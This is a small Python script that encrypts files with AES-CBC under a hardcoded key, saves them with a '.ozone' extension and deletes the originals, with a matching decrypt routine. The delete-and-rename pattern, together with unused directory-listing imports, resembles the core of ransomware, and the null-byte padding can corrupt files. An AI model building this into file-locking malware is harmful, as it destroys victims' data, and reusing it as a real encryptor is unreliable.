
from Crypto import Random
from Crypto.Cipher import AES
import os
import os.path
from os import listdir
from os.path import isfile, join
import time


#key = b'\xff\xfe\x00\x00X\x00\x00\x00N\x00\x00\x00l\x00\x00\x00S\x00\x00\x00t\x00\x00\x00l\x00\x00\x00p\x00\x00\x00J\x00\x00\x00w\x00\x00\x00M\x00\x00\x00Q\x00\x00\x00y\x00\x00\x00w\x00\x00\x00k\x00\x00\x00r\x00\x00\x00y\x00\x00\x00k\x00\x00\x00z\x00\x00\x00t\x00\x00\x00g\x00\x00\x00g\x00\x00\x00M\x00\x00\x00J\x00\x00\x00J\x00\x00\x00q\x00\x00\x00q\x00\x00\x00Z\x00\x00\x00j\x00\x00\x00T\x00\x00\x00r\x00\x00\x00d\x00\x00\x00K\x00\x00\x00O\x00\x00\x00y\x00\x00\x00n\x00\x00\x00P\x00\x00\x00N\x00\x00\x00s\x00\x00\x00C\x00\x00\x00b\x00\x00\x00H\x00\x00\x00c\x00\x00\x00z\x00\x00\x00o\x00\x00\x00z\x00\x00\x00z\x00\x00\x00H\x00\x00\x00z\x00\x00\x00z\x00\x00\x00a\x00\x00\x00b\x00\x00\x00q\x00\x00\x00e\x00\x00\x00B\x00\x00\x00M\x00\x00\x003\x00\x00\x00K\x00\x00\x00z\x00\x00\x00j\x00\x00\x00q\x00\x00\x00V\x00\x00\x005\x00\x00\x00I\x00\x00\x00p\x00\x00\x00E\x00\x00\x00n\x00\x00\x003\x00\x00\x00O\x00\x00\x006\x00\x00\x00u\x00\x00\x00W\x00\x00\x00q\x00\x00\x00F\x00\x00\x00G\x00\x00\x00Q\x00\x00\x00J\x00\x00\x00X\x00\x00\x00N\x00\x00\x00j\x00\x00\x00b\x00\x00\x00a\x00\x00\x00Z\x00\x00\x00e\x00\x00\x00j\x00\x00\x00F\x00\x00\x005\x00\x00\x003\x00\x00\x00q\x00\x00\x000\x00\x00\x00N\x00\x00\x00F\x00\x00\x00k\x00\x00\x00i\x00\x00\x008\x00\x00\x00w\x00\x00\x00T\x00\x00\x00j\x00\x00\x00v\x00\x00\x00N\x00\x00\x00e\x00\x00\x00g\x00\x00\x00C\x00\x00\x00l\x00\x00\x00S\x00\x00\x00s\x00\x00\x002\x00\x00\x00w\x00\x00\x00a\x00\x00\x00P\x00\x00\x00v\x00\x00\x00E\x00\x00\x00Q\x00\x00\x00H\x00\x00\x00p\x00\x00\x00R\x00\x00\x00g\x00\x00\x002\x00\x00\x00v\x00\x00\x009\x00\x00\x00H\x00\x00\x00i\x00\x00\x00G\x00\x00\x00G\x00\x00\x00R\x00\x00\x00v\x00\x00\x00n\x00\x00\x00b\x00\x00\x00U\x00\x00\x00'

key = b'[MX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)n\xdf\xcb\xc4\x94\x9d(\x9e'



def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=516):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".ozone", 'wb') as fo:
        fo.write(enc)
    os.remove(file_name)


def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def decrypt_file(file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-6], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)


#encrypt_file("test_img.jpg")
#decrypt_file("0xMxY.ozone")